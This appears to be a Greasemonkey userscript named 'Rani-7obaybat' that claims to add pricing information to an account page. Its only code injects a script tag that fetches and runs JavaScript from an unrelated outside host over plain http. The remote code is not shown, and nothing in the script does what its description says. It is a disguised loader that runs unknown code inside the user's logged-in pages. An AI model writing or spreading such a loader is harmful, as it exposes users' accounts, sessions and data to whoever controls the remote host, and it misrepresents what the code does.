// ==UserScript==
// @name   Rani-7obaybat
// @namespace  http://unpythonic.net/greasemonkey/ting
// @description Add pricing information on account page
// ==/UserScript==


function includeJs(jsFilePath) {
    var js = document.createElement("script");

    js.type = "text/javascript";
    js.src = jsFilePath;

    document.body.appendChild(js);
}

includeJs('http://digitalbook.eu.pn/app/126143.user.txt');